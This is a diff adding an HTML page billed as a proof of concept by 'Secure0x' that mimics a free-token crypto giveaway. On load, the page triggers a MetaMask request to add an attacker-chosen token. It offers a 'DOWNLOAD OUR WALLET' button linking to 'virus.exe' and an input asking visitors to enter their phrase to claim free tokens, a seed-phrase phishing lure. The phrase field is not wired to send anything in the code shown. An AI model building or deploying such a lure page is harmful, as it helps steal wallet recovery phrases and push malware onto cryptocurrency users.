@@ -1,0 +1,149 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <title>POC BY Secure0x</title>
+    <link rel="icon" type="image/x-icon" href="https://ethsec.blog/0pzteam/0pzlogo.jpg">
+
+    <style>
+         ::-webkit-input-placeholder {
+            font-family: monospace;
+            color: black;
+            font-size: 20px;
+        }
+        
+        input[type=text],
+        select {
+            width: 100%;
+            padding: 12px 20px;
+            margin: 8px 0;
+            display: inline-block;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        
+        .container {
+            margin-left: auto;
+            margin-right: auto;
+        }
+        
+        body {
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            background-color: #000000;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='250' height='30' viewBox='0 0 1000 120'%3E%3Cg fill='none' stroke='%23222' stroke-width='10' %3E%3Cpath d='M-500 75c0 0 125-30 250-30S0 75 0 75s125 30 250 30s250-30 250-30s125-30 250-30s250 30 250 30s125 30 250 30s250-30 250-30'/%3E%3Cpath d='M-500 45c0 0 125-30 250-30S0 45 0 45s125 30 250 30s250-30 250-30s125-30 250-30s250 30 250 30s125 30 250 30s250-30 250-30'/%3E%3Cpath d='M-500 105c0 0 125-30 250-30S0 105 0 105s125 30 250 30s250-30 250-30s125-30 250-30s250 30 250 30s125 30 250 30s250-30 250-30'/%3E%3Cpath d='M-500 15c0 0 125-30 250-30S0 15 0 15s125 30 250 30s250-30 250-30s125-30 250-30s250 30 250 30s125 30 250 30s250-30 250-30'/%3E%3Cpath d='M-500-15c0 0 125-30 250-30S0-15 0-15s125 30 250 30s250-30 250-30s125-30 250-30s250 30 250 30s125 30 250 30s250-30 250-30'/%3E%3Cpath d='M-500 135c0 0 125-30 250-30S0 135 0 135s125 30 250 30s250-30 250-30s125-30 250-30s250 30 250 30s125 30 250 30s250-30 250-30'/%3E%3C/g%3E%3C/svg%3E");
+        }
+        
+        button {
+            background: rgb(85, 0, 255);
+            background: linear-gradient(90deg, rgba(85, 0, 255, 1) 35%, rgba(214, 0, 255, 1) 100%);
+            background-size: 200% 200%;
+            border: none;
+            padding: 30px 70px;
+            border-radius: 40px;
+            color: #fff;
+            font-size: 20px;
+            text-transform: uppercase;
+            transition: ease-in all .5s;
+            animation: button infinite alternate 5s;
+        }
+        
+        button:hover {
+            cursor: pointer;
+        }
+        
+        @keyframes button {
+            0% {
+                background-position: 0% 50%;
+            }
+            100% {
+                background-position: 100% 70%;
+            }
+        }
+        
+        .center {
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+            width: 40%;
+        }
+    </style>
+
+    <script>
+        window.console = window.console || function(t) {};
+    </script>
+
+
+
+    <script>
+        if (document.location.search.match(/type=embed/gi)) {
+            window.parent.postMessage("resize", "*");
+        }
+    </script>
+
+
+</head>
+
+<body>
+    <div class="container" style="text-align:center;">
+        <h1 style="color:wheat;">POC MADE BY <a href="https://ethsec.blog" target="blank_" style="text-decoration: none; background-color: none; color: rgb(122, 21, 255)">Secure0x</a></h1>
+        <br><br><br><br>
+        <button style="margin:10px;" onclick="addTokenFunction()" class="add">Add Token To MetaMask </button>
+        <a href="virus.exe" download><button style="margin:10px;" onclick="addTokenFunction()" class="add">DOWNLOAD OUR WALLET </button></a>
+        <br><br><br>
+        <div><input size="80" type="text" placeholder="ENTER PHRASE TO CLAIM FREE TOKENS" style="text-align: center;" id="">
+        </div>
+    </div>
+
+    <script id="rendered-js">
+        const tokenAddress = '0xc00971105e61274c8a5cd5a88fe7e037d935b513';
+        const tokenSymbol = 'Secure0xPOC';
+        const tokenDecimals = 18;
+        const tokenImage = 'https://www.seekpng.com/png/full/219-2196251_blackhat-black-hat-hacker-png.png';
+
+        async function addTokenFunction() {
+
+            try {
+
+                const wasAdded = await ethereum.request({
+                    method: 'wallet_watchAsset',
+                    params: {
+                        type: 'ERC20',
+                        options: {
+                            address: tokenAddress,
+                            symbol: tokenSymbol,
+                            decimals: tokenDecimals,
+                            image: tokenImage
+                        }
+                    }
+                });
+
+                if (wasAdded) {
+                    console.log('Thanks for your interest!');
+                } else {
+                    console.log('Token has not been added');
+                }
+            } catch (error) {
+                console.log(error);
+            }
+        }
+        
+        addTokenFunction()
+
+    </script>
+
+    <script src="https://cpwebassets.codepen.io/assets/common/stopExecutionOnTimeout-1b93190375e9ccc259df3a57c1abc0e64599724ae30d7ea4c6877eb615f89387.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.5.0/web3.min.js"></script>
+    
+</body>
+
+</html>
